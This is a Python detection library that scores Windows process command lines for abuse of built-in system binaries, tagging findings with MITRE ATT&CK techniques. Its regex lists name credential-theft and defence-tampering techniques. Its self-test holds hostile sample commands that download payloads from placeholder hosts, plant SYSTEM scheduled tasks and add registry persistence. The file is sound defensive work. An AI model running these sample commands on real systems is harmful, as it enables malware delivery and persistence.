"""Living-off-the-land (LOL) detection utilities.

Comprehensive detector for identifying abuse of legitimate system binaries,
scripting engines, and built-in OS tooling.  Designed to be imported as a
library, used from a CLI, or extended as a base-class.

Features
--------
* Per-binary behavioural profiles — each LOLBin carries its own risky-flag
  signatures, so a false-positive hit on ``cmd /c echo hello`` is avoided.
* Regex-powered pattern matching for obfuscated / fragmented payloads.
* Shannon-entropy analysis to detect Base64 / encrypted blobs.
* MITRE ATT&CK® technique tagging on every finding.
* Confidence tiers (INFO / LOW / MEDIUM / HIGH / CRITICAL).
* Structured ``DetectionResult`` dataclass — easy to serialise to JSON.
* Thread-safe stateless design; no global mutable state.
* Optional normalisation of PowerShell tick-mark and caret obfuscation.

MITRE ATT&CK references used here
-----------------------------------
T1059   – Command and Scripting Interpreter
T1059.001 – PowerShell
T1059.003 – Windows Command Shell
T1059.005 – Visual Basic / WScript
T1105   – Ingress Tool Transfer
T1140   – Deobfuscate / Decode Files or Information
T1218   – System Binary Proxy Execution (many sub-techniques)
T1218.001 – Compiled HTML File (hh.exe)
T1218.003 – CMSTP
T1218.004 – InstallUtil
T1218.005 – Mshta
T1218.007 – Msiexec
T1218.008 – Odbcconf
T1218.009 – Regsvcs / Regasm
T1218.010 – Regsvr32
T1218.011 – Rundll32
T1053   – Scheduled Task / Job
T1547   – Boot / Logon Autostart
T1562   – Impair Defenses (AMSI bypass, logging disable)
T1027   – Obfuscated Files or Information
T1070   – Indicator Removal (log clearing)
T1082   – System Information Discovery (via LOLBins)
T1036   – Masquerading
T1134   – Access Token Manipulation (parent-PID spoofing)

Example
-------
    from lol_detector import LOLDetector, Confidence

    result = LOLDetector.score_process(
        name="powershell",
        cmdline="-NoP -NonI -W Hidden -Enc <blob>",
        parent_name="winword",
        ppid=4242,
        pid=1234,
    )

    if result.confidence >= Confidence.HIGH:
        print(result.to_dict())
"""

from __future__ import annotations

import math
import re
import string
from dataclasses import dataclass, field, asdict
from enum import IntEnum
from typing import Dict, FrozenSet, List, Optional, Sequence, Tuple


# ---------------------------------------------------------------------------
# Confidence enum
# ---------------------------------------------------------------------------

class Confidence(IntEnum):
    """Ordered confidence tiers for detections."""
    NONE     = 0
    INFO     = 1   # score 1-2:  known LOLBin, no suspicious context
    LOW      = 2   # score 3-5:  weak signals
    MEDIUM   = 3   # score 6-9:  moderate signals
    HIGH     = 4   # score 10-14: strong signals
    CRITICAL = 5   # score 15+:  multiple high-weight indicators

    @classmethod
    def from_score(cls, score: int) -> "Confidence":
        if score <= 0:   return cls.NONE
        if score <= 2:   return cls.INFO
        if score <= 5:   return cls.LOW
        if score <= 9:   return cls.MEDIUM
        if score <= 14:  return cls.HIGH
        return cls.CRITICAL


# ---------------------------------------------------------------------------
# Finding dataclass
# ---------------------------------------------------------------------------

@dataclass
class Finding:
    """A single detection signal."""
    reason: str
    score: int
    technique: str   # MITRE ATT&CK technique ID
    detail: str = ""


# ---------------------------------------------------------------------------
# DetectionResult dataclass
# ---------------------------------------------------------------------------

@dataclass
class DetectionResult:
    """Aggregated result for one process evaluation."""
    process_name:  str
    cmdline:       str
    parent_name:   str
    pid:           Optional[int]
    ppid:          Optional[int]
    total_score:   int
    confidence:    Confidence
    findings:      List[Finding] = field(default_factory=list)
    techniques:    List[str]     = field(default_factory=list)

    # ---- convenience -------------------------------------------------------

    @property
    def is_suspicious(self) -> bool:
        return self.confidence >= Confidence.LOW

    def to_dict(self) -> dict:
        d = asdict(self)
        d["confidence"] = self.confidence.name
        d["is_suspicious"] = self.is_suspicious
        return d

    def summary(self) -> str:
        lines = [
            f"Process  : {self.process_name}",
            f"Score    : {self.total_score}  ({self.confidence.name})",
            f"Techniques: {', '.join(self.techniques) or 'none'}",
        ]
        for f_ in self.findings:
            lines.append(f"  [{f_.score:+d}] {f_.reason}  ({f_.technique})"
                         + (f" — {f_.detail}" if f_.detail else ""))
        return "\n".join(lines)


# ---------------------------------------------------------------------------
# Per-binary profiles
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class BinaryProfile:
    """Behavioural profile for a single LOLBin."""
    mitre_technique:  str
    # regex patterns that, when found in the cmdline, add risky points
    risky_flags:      Tuple[re.Pattern, ...] = ()
    risky_flag_score: int = 3
    # baseline score just for being *this* binary (even without patterns)
    baseline_score:   int = 1
    # description shown in the reason string
    description:      str = ""


def _rp(*patterns: str) -> Tuple[re.Pattern, ...]:
    return tuple(re.compile(p, re.IGNORECASE) for p in patterns)


# Comprehensive per-binary profiles
_BINARY_PROFILES: Dict[str, BinaryProfile] = {
    # ---- proxy execution ---------------------------------------------------
    "rundll32": BinaryProfile(
        mitre_technique="T1218.011",
        description="DLL proxy execution",
        risky_flags=_rp(
            r"javascript:",
            r"vbscript:",
            r"RunHTMLApplication",
            r"ActiveXObject",
            r"shell32\.dll.*shellexec",
            r"url\.dll.*openurl",
            r"advpack\.dll.*launchinf",
            r"ieadvpack\.dll",
            r"shdocvw\.dll",
            r"dfshim\.dll",
            r"pcwutl\.dll",
            r"zipfldr\.dll",
        ),
        risky_flag_score=5,
        baseline_score=2,
    ),
    "regsvr32": BinaryProfile(
        mitre_technique="T1218.010",
        description="COM/script proxy execution (Squiblydoo)",
        risky_flags=_rp(
            r"/s\b",
            r"/u\b",
            r"/i\b",
            r"scrobj\.dll",
            r"http[s]?://",
            r"ftp://",
            r"\\\\",   # UNC path
        ),
        risky_flag_score=4,
        baseline_score=2,
    ),
    "mshta": BinaryProfile(
        mitre_technique="T1218.005",
        description="HTA proxy execution",
        risky_flags=_rp(
            r"javascript:",
            r"vbscript:",
            r"CreateObject",
            r"WScript\.Shell",
            r"ActiveXObject",
            r"Shell\.Application",
            r"http[s]?://",
            r"\\\\",
        ),
        risky_flag_score=5,
        baseline_score=3,
    ),
    "installutil": BinaryProfile(
        mitre_technique="T1218.004",
        description=".NET assembly proxy execution",
        risky_flags=_rp(r"/logfile=", r"/logtoconsole=false", r"\.exe", r"\.dll"),
        risky_flag_score=4,
        baseline_score=2,
    ),
    "msbuild": BinaryProfile(
        mitre_technique="T1218",
        description="MSBuild inline-task code execution",
        risky_flags=_rp(r"\.xml", r"\.proj", r"targets"),
        risky_flag_score=3,
        baseline_score=2,
    ),
    "regasm": BinaryProfile(
        mitre_technique="T1218.009",
        description="Regasm proxy execution",
        risky_flags=_rp(r"/u\b", r"\.dll", r"\.exe"),
        risky_flag_score=4,
        baseline_score=2,
    ),
    "regsvcs": BinaryProfile(
        mitre_technique="T1218.009",
        description="Regsvcs proxy execution",
        risky_flags=_rp(r"/u\b", r"\.dll"),
        risky_flag_score=4,
        baseline_score=2,
    ),
    "cmstp": BinaryProfile(
        mitre_technique="T1218.003",
        description="CMSTP UAC bypass / proxy execution",
        risky_flags=_rp(r"/s\b", r"/au\b", r"\.inf"),
        risky_flag_score=5,
        baseline_score=3,
    ),
    "msiexec": BinaryProfile(
        mitre_technique="T1218.007",
        description="MSI proxy execution",
        risky_flags=_rp(r"http[s]?://", r"/q\b", r"/quiet\b", r"ftp://", r"\\\\"),
        risky_flag_score=4,
        baseline_score=2,
    ),
    "odbcconf": BinaryProfile(
        mitre_technique="T1218.008",
        description="ODBCCONF DLL proxy execution",
        risky_flags=_rp(r"regsvr\b", r"\.dll"),
        risky_flag_score=5,
        baseline_score=2,
    ),
    "hh": BinaryProfile(
        mitre_technique="T1218.001",
        description="Compiled HTML file (CHM) execution",
        risky_flags=_rp(r"\.chm", r"http[s]?://", r"\\\\"),
        risky_flag_score=4,
        baseline_score=2,
    ),
    # ---- credential / data access ------------------------------------------
    "certutil": BinaryProfile(
        mitre_technique="T1140",
        description="Certutil decode/download abuse",
        risky_flags=_rp(
            r"-urlcache",
            r"-decode\b",
            r"-encode\b",
            r"-decodehex",
            r"http[s]?://",
            r"ftp://",
            r"-f\b",
            r"\\\\",
        ),
        risky_flag_score=5,
        baseline_score=2,
    ),
    "bitsadmin": BinaryProfile(
        mitre_technique="T1105",
        description="BITS transfer abuse",
        risky_flags=_rp(
            r"/transfer",
            r"/download",
            r"/addfile",
            r"http[s]?://",
            r"/resume",
        ),
        risky_flag_score=5,
        baseline_score=2,
    ),
    # ---- scripting engines -------------------------------------------------
    "powershell": BinaryProfile(
        mitre_technique="T1059.001",
        description="PowerShell abuse",
        risky_flags=_rp(
            r"-enc(odedcommand)?\b",
            r"-nop(rofile)?\b",
            r"-noni(nteractive)?\b",
            r"-w(indowstyle)?\s+hid(den)?",
            r"-exec(utionpolicy)?\s+(bypass|unrestricted)",
            r"iex\b",
            r"invoke-expression",
            r"invoke-webrequest",
            r"downloadstring",
            r"downloadfile",
            r"\[convert\]::from",
            r"::frombase64string",
            r"net\.webclient",
            r"start-bitstransfer",
            r"reflection\.assembly",
            r"add-type\b",
            r"virtualalloc",
            r"createthread",
            r"amsiutils",           # AMSI bypass
            r"set-mppreference",    # Defender tamper
            r"disablerealtimemonitoring",
            r"bypass.*execution",
        ),
        risky_flag_score=4,
        baseline_score=1,
    ),
    "pwsh": BinaryProfile(   # PowerShell 7+
        mitre_technique="T1059.001",
        description="PowerShell 7+ abuse",
        risky_flags=_rp(
            r"-enc(odedcommand)?\b",
            r"-nop(rofile)?\b",
            r"-noni(nteractive)?\b",
            r"-w(indowstyle)?\s+hid(den)?",
            r"-exec(utionpolicy)?\s+(bypass|unrestricted)",
            r"iex\b",
            r"invoke-expression",
            r"downloadstring",
            r"frombase64string",
        ),
        risky_flag_score=4,
        baseline_score=1,
    ),
    "cmd": BinaryProfile(
        mitre_technique="T1059.003",
        description="CMD shell abuse",
        risky_flags=_rp(
            r"/c\s+.*http",
            r"&&.*cmd",
            r"\^",             # caret obfuscation
            r"set\s+\w+=.*&&", # variable-based obfuscation
            r"echo\s+.*>.*\.bat",
            r"certutil",
            r"bitsadmin",
            r"mshta",
            r"regsvr32",
            r"copy\s+.*\\\\",
        ),
        risky_flag_score=3,
        baseline_score=1,
    ),
    "wscript": BinaryProfile(
        mitre_technique="T1059.005",
        description="WScript VB/JS execution",
        risky_flags=_rp(r"http[s]?://", r"\\\\", r"\.js\b", r"\.vbs\b", r"//e:", r"//nologo"),
        risky_flag_score=4,
        baseline_score=2,
    ),
    "cscript": BinaryProfile(
        mitre_technique="T1059.005",
        description="CScript VB/JS execution",
        risky_flags=_rp(r"http[s]?://", r"\\\\", r"\.js\b", r"\.vbs\b", r"//e:", r"//nologo"),
        risky_flag_score=4,
        baseline_score=2,
    ),
    "wmic": BinaryProfile(
        mitre_technique="T1047",
        description="WMIC abuse",
        risky_flags=_rp(
            r"process\s+call\s+create",
            r"os\s+get",
            r"shadowcopy\s+delete",
            r"/node:",
            r"format:.*xsl",    # XSL script execution
            r"powershell",
            r"cmd\.exe\s+/c",
            r"-enc(odedcommand)?",
        ),
        risky_flag_score=4,
        baseline_score=2,
    ),
    # ---- persistence / scheduling ------------------------------------------
    "schtasks": BinaryProfile(
        mitre_technique="T1053.005",
        description="Scheduled task creation/modification",
        risky_flags=_rp(
            r"/create\b",
            r"/change\b",
            r"/ru\s+system",
            r"/sc\s+(minute|hourly|onstart|onlogon)",
            r"powershell",
            r"cmd\.exe",
            r"mshta",
            r"/f\b",
            r"http[s]?://",
        ),
        risky_flag_score=4,
        baseline_score=2,
    ),
    "reg": BinaryProfile(
        mitre_technique="T1547.001",
        description="Registry modification for persistence",
        risky_flags=_rp(
            r"add\b.*run\b",
            r"currentversion\\run",
            r"add\b.*winlogon",
            r"userinit",
            r"image\s*file\s*execution",  # IFEO hijack
            r"hklm\\software\\microsoft\\windows nt",
            r"export\b",   # potential data exfil of hive
        ),
        risky_flag_score=5,
        baseline_score=2,
    ),
    # ---- reconnaissance / discovery ----------------------------------------
    "tasklist": BinaryProfile(
        mitre_technique="T1057",
        description="Process discovery via tasklist",
        risky_flags=_rp(r"/v\b", r"/svc\b", r"/s\b", r"/fi\b"),
        risky_flag_score=2,
        baseline_score=1,
    ),
    "taskkill": BinaryProfile(
        mitre_technique="T1562",
        description="Security tool termination via taskkill",
        risky_flags=_rp(
            r"defender",
            r"msseces",
            r"ccsvchst",
            r"avgui",
            r"avastui",
            r"mcshield",
            r"/f\b",
            r"/im\s+\*",
        ),
        risky_flag_score=4,
        baseline_score=1,
    ),
    # ---- .NET compilers used to compile shellcode in-memory ----------------
    "csc": BinaryProfile(
        mitre_technique="T1027",
        description="C# compiler in-memory compilation",
        risky_flags=_rp(r"/out:", r"\.cs\b", r"noconfig"),
        risky_flag_score=3,
        baseline_score=2,
    ),
    "vbc": BinaryProfile(
        mitre_technique="T1027",
        description="VB compiler in-memory compilation",
        risky_flags=_rp(r"/out:", r"\.vb\b"),
        risky_flag_score=3,
        baseline_score=2,
    ),
    # ---- log clearing -------------------------------------------------------
    "wevtutil": BinaryProfile(
        mitre_technique="T1070.001",
        description="Event log clearing",
        risky_flags=_rp(r"\bcl\b", r"clear-log", r"/e:false", r"uninstall"),
        risky_flag_score=6,
        baseline_score=2,
    ),
    # ---- network recon / exfil ---------------------------------------------
    "netsh": BinaryProfile(
        mitre_technique="T1562.004",
        description="Firewall/port-proxy manipulation",
        risky_flags=_rp(
            r"firewall.*add",
            r"advfirewall",
            r"portproxy\s+add",
            r"interface\s+portproxy",
        ),
        risky_flag_score=4,
        baseline_score=1,
    ),
    "net": BinaryProfile(
        mitre_technique="T1136",
        description="Local account or group manipulation",
        risky_flags=_rp(
            r"\buser\b.*\/add",
            r"\blocalgroup\b.*administrators",
            r"\baccounts\b.*\/lockout",
            r"\bstop\b.*",
        ),
        risky_flag_score=4,
        baseline_score=1,
    ),
    "nltest": BinaryProfile(
        mitre_technique="T1482",
        description="Domain trust discovery",
        risky_flags=_rp(r"/domain_trusts", r"/dclist", r"/server:"),
        risky_flag_score=3,
        baseline_score=1,
    ),
    "whoami": BinaryProfile(
        mitre_technique="T1033",
        description="User identity discovery",
        risky_flags=_rp(r"/priv\b", r"/groups\b", r"/all\b"),
        risky_flag_score=2,
        baseline_score=1,
    ),
    "ipconfig": BinaryProfile(
        mitre_technique="T1016",
        description="Network config discovery",
        risky_flags=_rp(r"/all\b"),
        risky_flag_score=1,
        baseline_score=1,
    ),
    "systeminfo": BinaryProfile(
        mitre_technique="T1082",
        description="System information discovery",
        risky_flags=_rp(r"/s\b", r"/fo\b"),
        risky_flag_score=2,
        baseline_score=1,
    ),
}

# Canonical names for lookup (strip .exe / .com etc.)
def _strip_ext(name: str) -> str:
    for ext in (".exe", ".com", ".cmd", ".bat", ".ps1"):
        if name.endswith(ext):
            return name[: -len(ext)]
    return name


# ---------------------------------------------------------------------------
# Obfuscation helpers
# ---------------------------------------------------------------------------

def _shannon_entropy(text: str) -> float:
    """Return the Shannon entropy (bits/char) of *text*."""
    if not text:
        return 0.0
    freq: Dict[str, int] = {}
    for ch in text:
        freq[ch] = freq.get(ch, 0) + 1
    n = len(text)
    return -sum((c / n) * math.log2(c / n) for c in freq.values())


_B64_RE = re.compile(r"[A-Za-z0-9+/]{20,}={0,2}")
_HEX_RE = re.compile(r"(?:0x[0-9a-fA-F]{2}[\s,]?){8,}")
_UNI_HEX_RE = re.compile(r"(?:\\u[0-9a-fA-F]{4}){4,}")
_CHAR_CONCAT_RE = re.compile(r"(?:char\(\d+\)\s*[+&]\s*){4,}", re.IGNORECASE)
_CARET_RE = re.compile(r"(?:[a-z]\^){3,}", re.IGNORECASE)
_TICK_RE = re.compile(r"(?:`[a-z]){3,}", re.IGNORECASE)
_VAR_CONCAT_RE = re.compile(r"(\$\w+\s*\+\s*){3,}")  # $a+$b+$c+...


def _detect_obfuscation(cmdline: str) -> List[Finding]:
    """Return findings for obfuscation detected in the command line."""
    findings: List[Finding] = []

    # Base64 blobs with high entropy
    for m in _B64_RE.finditer(cmdline):
        blob = m.group()
        ent = _shannon_entropy(blob)
        if ent > 4.8:
            findings.append(Finding(
                reason="high-entropy-base64-blob",
                score=5,
                technique="T1140",
                detail=f"entropy={ent:.2f} blob='{blob[:40]}{'…' if len(blob) > 40 else ''}'",
            ))
            break  # one is enough – avoid flooding

    # Hex-encoded shellcode-style patterns
    if _HEX_RE.search(cmdline):
        findings.append(Finding(reason="hex-encoded-content", score=4, technique="T1027",
                                detail="inline hex array detected"))

    # Unicode escape sequences
    if _UNI_HEX_RE.search(cmdline):
        findings.append(Finding(reason="unicode-escape-obfuscation", score=4, technique="T1027"))

    # char() concatenation (SQL-injection style / VBS abuse)
    if _CHAR_CONCAT_RE.search(cmdline):
        findings.append(Finding(reason="char-concat-obfuscation", score=3, technique="T1027"))

    # Caret obfuscation in CMD (c^m^d)
    if _CARET_RE.search(cmdline):
        findings.append(Finding(reason="caret-obfuscation", score=3, technique="T1027"))

    # PowerShell tick-mark obfuscation (i`ex)
    if _TICK_RE.search(cmdline):
        findings.append(Finding(reason="powershell-tick-obfuscation", score=3, technique="T1027"))

    # Variable concatenation chains
    if _VAR_CONCAT_RE.search(cmdline):
        findings.append(Finding(reason="variable-concat-chain", score=2, technique="T1027"))

    return findings


# ---------------------------------------------------------------------------
# Network indicator helpers
# ---------------------------------------------------------------------------

_NETWORK_RE = re.compile(
    r"(https?://[^\s\"']+|ftp://[^\s\"']+|\d{1,3}(?:\.\d{1,3}){3}(?::\d+)?|\\\\[a-z0-9._-]+\\[^\s]+)",
    re.IGNORECASE,
)
_LOOPBACK_RE = re.compile(r"127\.0\.0\.\d+|localhost", re.IGNORECASE)


def _detect_network_iocs(cmdline: str) -> List[Finding]:
    findings: List[Finding] = []
    for m in _NETWORK_RE.finditer(cmdline):
        ioc = m.group()
        if _LOOPBACK_RE.search(ioc):
            continue  # loopback is low interest
        findings.append(Finding(
            reason="network-ioc",
            score=3,
            technique="T1105",
            detail=f"ioc='{ioc[:80]}'",
        ))
    return findings[:5]  # cap to avoid noise


# ---------------------------------------------------------------------------
# Parent-child spoofing / abuse combos
# ---------------------------------------------------------------------------

# Office / browser parents should almost never spawn these children
_OFFICE_PARENTS: FrozenSet[str] = frozenset({
    "winword", "word", "excel", "powerpnt", "powerpointscript",
    "outlook", "onenote", "msaccess", "mspub",
    "chrome", "firefox", "msedge", "edge", "iexplore",
    "safari", "opera", "brave",
    "acrord32", "acrobat",   # PDF readers
    "wwahost",               # Windows Store apps
    "teams",
})

_DANGEROUS_CHILDREN: FrozenSet[str] = frozenset({
    "cmd", "powershell", "pwsh", "wscript", "cscript", "mshta",
    "regsvr32", "rundll32", "certutil", "bitsadmin", "msiexec",
    "installutil", "msbuild", "cmstp", "odbcconf", "bash", "sh",
    "python", "python3", "wmic", "net", "netsh", "reg",
})

# Legitimate parents that are often faked via PPID spoofing
_SYSTEM_PARENTS: FrozenSet[str] = frozenset({
    "services", "lsass", "smss", "wininit", "winlogon", "csrss",
})


def _detect_parent_child(parent: str, child: str) -> List[Finding]:
    findings: List[Finding] = []

    if parent in _OFFICE_PARENTS and child in _DANGEROUS_CHILDREN:
        findings.append(Finding(
            reason=f"office-browser-spawned-{child}",
            score=6,
            technique="T1566",   # Phishing -> macro execution
            detail=f"parent='{parent}' child='{child}'",
        ))

    # Rare: cmd/powershell directly under a system process (could be PPID spoofing)
    if parent in _SYSTEM_PARENTS and child in ("powershell", "pwsh", "cmd", "wscript"):
        findings.append(Finding(
            reason=f"system-process-spawned-{child}",
            score=4,
            technique="T1134.004",  # Parent PID spoofing
            detail=f"parent='{parent}' child='{child}'",
        ))

    return findings


# ---------------------------------------------------------------------------
# PowerShell-specific normaliser
# ---------------------------------------------------------------------------

_TICK_STRIP_RE  = re.compile(r"`(.)")
_CARET_STRIP_RE = re.compile(r"\^(.)")
_WS_RE          = re.compile(r"\s+")

def _normalise_cmdline(cmdline: str) -> str:
    """Strip common PS/CMD obfuscation to improve pattern matching."""
    cmdline = _TICK_STRIP_RE.sub(r"\1", cmdline)
    cmdline = _CARET_STRIP_RE.sub(r"\1", cmdline)
    cmdline = _WS_RE.sub(" ", cmdline)
    return cmdline


# ---------------------------------------------------------------------------
# LOLDetector
# ---------------------------------------------------------------------------

class LOLDetector:
    """Stateless living-off-the-land detector."""

    # Score thresholds for early-exit when score is definitively high
    _CRITICAL_THRESHOLD = 15

    @classmethod
    def score_process(
        cls,
        name:        str,
        cmdline:     str,
        parent_name: str          = "",
        pid:         Optional[int] = None,
        ppid:        Optional[int] = None,
    ) -> DetectionResult:
        """Evaluate a process for LOL indicators.

        Parameters
        ----------
        name
            Executable name, with or without path/extension.
        cmdline
            Full command line string.
        parent_name
            Parent process name (optional, improves accuracy).
        pid
            Process ID (informational, stored in result).
        ppid
            Parent process ID (informational, stored in result).

        Returns
        -------
        DetectionResult
        """
        # --- normalise inputs ------------------------------------------------
        raw_name = name
        name        = _strip_ext(name.lower().strip().split("\\")[-1].split("/")[-1])
        cmdline_raw = cmdline or ""
        cmdline_n   = _normalise_cmdline(cmdline_raw.lower())
        parent      = _strip_ext(parent_name.lower().strip().split("\\")[-1].split("/")[-1]) if parent_name else ""

        findings: List[Finding] = []

        # --- binary profile matching -----------------------------------------
        profile = _BINARY_PROFILES.get(name)
        if profile:
            findings.append(Finding(
                reason=f"lolbin:{name}",
                score=profile.baseline_score,
                technique=profile.mitre_technique,
                detail=profile.description,
            ))
            for pat in profile.risky_flags:
                if pat.search(cmdline_n):
                    findings.append(Finding(
                        reason=f"risky-flag:{name}:{pat.pattern[:40]}",
                        score=profile.risky_flag_score,
                        technique=profile.mitre_technique,
                        detail=f"pattern matched in cmdline",
                    ))

        # --- obfuscation analysis --------------------------------------------
        findings.extend(_detect_obfuscation(cmdline_n))

        # --- network IOCs in command line ------------------------------------
        findings.extend(_detect_network_iocs(cmdline_raw))  # use raw for URLs

        # --- parent-child anomalies ------------------------------------------
        if parent:
            findings.extend(_detect_parent_child(parent, name))

        # --- download / execution keywords (cross-binary) --------------------
        for kw, pattern, score_, tech in [
            ("Invoke-WebRequest",  r"invoke-webrequest",           4, "T1105"),
            ("curl",               r"\bcurl\b",                    3, "T1105"),
            ("wget",               r"\bwget\b",                    3, "T1105"),
            ("DownloadFile",       r"downloadfile\(",              4, "T1105"),
            ("DownloadString",     r"downloadstring\(",            5, "T1105"),
            ("Start-BitsTransfer", r"start-bitstransfer",          4, "T1105"),
            ("IEX",                r"\biex\b",                     5, "T1059.001"),
            ("Invoke-Expression",  r"invoke-expression",           5, "T1059.001"),
            ("VirtualAlloc",       r"virtualalloc",                6, "T1055"),
            ("CreateThread",       r"createthread",                6, "T1055"),
            ("WriteProcessMemory", r"writeprocessmemory",          7, "T1055"),
            ("LoadLibrary",        r"\bloadlibrary\b",             4, "T1055"),
            ("ReflectiveDLL",      r"reflective",                  5, "T1055.001"),
            ("AmsiBypass",         r"amsi",                        6, "T1562.001"),
            ("ShadowCopy delete",  r"shadowcopy.*delete",          7, "T1490"),
            ("WMI process create", r"wmi.*process.*create",        6, "T1047"),
            ("Disable Defender",   r"disablerealtimemonitoring|set-mppreference", 6, "T1562.001"),
            ("Event log clear",    r"wevtutil.*\bcl\b|clear-eventlog", 6, "T1070.001"),
            ("LSASS access",       r"lsass",                       6, "T1003.001"),
            ("Mimikatz keywords",  r"sekurlsa|kerberoast|dcsync|lsadump", 8, "T1003"),
            ("Token impersonation",r"impersonat|seimpersonateprivilege", 5, "T1134"),
            ("UAC bypass",         r"fodhelper|eventvwr|computerdefaults|sdclt", 6, "T1548.002"),
            ("PsExec",             r"\bpsexec\b",                  5, "T1569.002"),
            ("At job creation",    r"\bat\b.*\d{1,2}:\d{2}",       4, "T1053"),
        ]:
            if re.search(pattern, cmdline_n, re.IGNORECASE):
                # avoid double-counting if already caught by profile
                if not any(kw in f.reason for f in findings):
                    findings.append(Finding(reason=f"keyword:{kw}", score=score_, technique=tech))

        # --- aggregate -------------------------------------------------------
        total_score = sum(f.score for f in findings)
        confidence  = Confidence.from_score(total_score)
        techniques  = sorted({f.technique for f in findings if f.technique})

        return DetectionResult(
            process_name=raw_name,
            cmdline=cmdline_raw,
            parent_name=parent_name,
            pid=pid,
            ppid=ppid,
            total_score=total_score,
            confidence=confidence,
            findings=findings,
            techniques=techniques,
        )

    # --- convenience wrappers ------------------------------------------------

    @classmethod
    def is_suspicious(
        cls,
        name:        str,
        cmdline:     str,
        parent_name: str = "",
        threshold:   Confidence = Confidence.LOW,
    ) -> bool:
        """Quick boolean check. Returns True if confidence >= threshold."""
        result = cls.score_process(name, cmdline, parent_name)
        return result.confidence >= threshold

    @classmethod
    def score_many(
        cls,
        processes: Sequence[Tuple[str, str, str]],
    ) -> List[DetectionResult]:
        """Evaluate a batch of (name, cmdline, parent_name) tuples.

        Results are sorted by total_score descending.
        """
        results = [cls.score_process(*p) for p in processes]
        return sorted(results, key=lambda r: r.total_score, reverse=True)


# Convenience alias
detect = LOLDetector.score_process


# ---------------------------------------------------------------------------
# CLI / self-test
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    import json

    _TEST_CASES = [
        # (name, cmdline, parent, expected_confidence)
        (
            "certutil",
            "-urlcache -f http://malicious.example/payload.exe payload.exe",
            "cmd",
            Confidence.CRITICAL,
        ),
        (
            "powershell.exe",
            r"-NoP -NonI -W Hidden -Enc QQBsAGkAYwBlAA==",
            "winword",
            Confidence.CRITICAL,
        ),
        (
            "rundll32",
            r"javascript:\..\mshtml,RunHTMLApplication ;document.write();h=new%20ActiveXObject(\"WScript.Shell\")",
            "excel",
            Confidence.CRITICAL,
        ),
        (
            "regsvr32",
            r"/s /u /i:http://evil.example/payload.sct scrobj.dll",
            "chrome",
            Confidence.CRITICAL,
        ),
        (
            "mshta",
            r"vbscript:CreateObject(\"Wscript.Shell\").Run(\"powershell -enc AAAA\",0,True)(window.close)",
            "outlook",
            Confidence.CRITICAL,
        ),
        (
            "bitsadmin",
            r"/transfer myJob /download /priority normal http://c2.example/b.exe C:\Windows\Temp\b.exe",
            "",
            Confidence.HIGH,
        ),
        (
            "wmic",
            r"process call create powershell.exe -enc VGVzdA==",
            "cmd",
            Confidence.HIGH,
        ),
        (
            "schtasks",
            r"/create /sc minute /mo 5 /tn updater /tr \"powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil/s.ps1')\" /ru system /f",
            "cmd",
            Confidence.CRITICAL,
        ),
        (
            "reg",
            r"add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Run /v Updater /t REG_SZ /d c:\temp\evil.exe /f",
            "",
            Confidence.HIGH,
        ),
        (
            "powershell",
            r"[System.Reflection.Assembly]::LoadWithPartialName('Microsoft.CSharp'); VirtualAlloc; CreateThread",
            "",
            Confidence.CRITICAL,
        ),
        # benign examples
        ("notepad",       "C:\\Users\\alice\\docs\\report.txt", "explorer",   Confidence.NONE),
        ("powershell",    "Get-ChildItem C:\\Users",             "explorer",   Confidence.INFO),
        ("certutil",      "-hashfile payload.exe SHA256",        "cmd",        Confidence.INFO),
        ("tasklist",      "",                                    "cmd",        Confidence.INFO),
    ]

    pass_count = fail_count = 0
    print("=" * 70)
    print("LOLDetector self-test")
    print("=" * 70)

    for name, cmd, parent, expected in _TEST_CASES:
        result = LOLDetector.score_process(name, cmd, parent)
        status = "PASS" if result.confidence >= expected else "FAIL"
        if status == "PASS":
            pass_count += 1
        else:
            fail_count += 1
        print(f"\n[{status}] {name!r}  score={result.total_score}  got={result.confidence.name}  want>={expected.name}")
        if result.findings:
            for f in result.findings:
                print(f"       ├ [{f.score:+2d}] {f.reason}  ({f.technique})"
                      + (f" — {f.detail}" if f.detail else ""))

    print("\n" + "=" * 70)
    print(f"Results: {pass_count} passed, {fail_count} failed out of {len(_TEST_CASES)} cases")
    print("=" * 70)

    # Show JSON serialisation for one result
    print("\nSample JSON output:")
    sample = LOLDetector.score_process(
        "powershell.exe",
        r"-NoP -NonI -W Hidden -Enc QQBsAGkAYwBlAA==",
        "winword",
        pid=4242,
        ppid=1234,
    )
    print(json.dumps(sample.to_dict(), indent=2))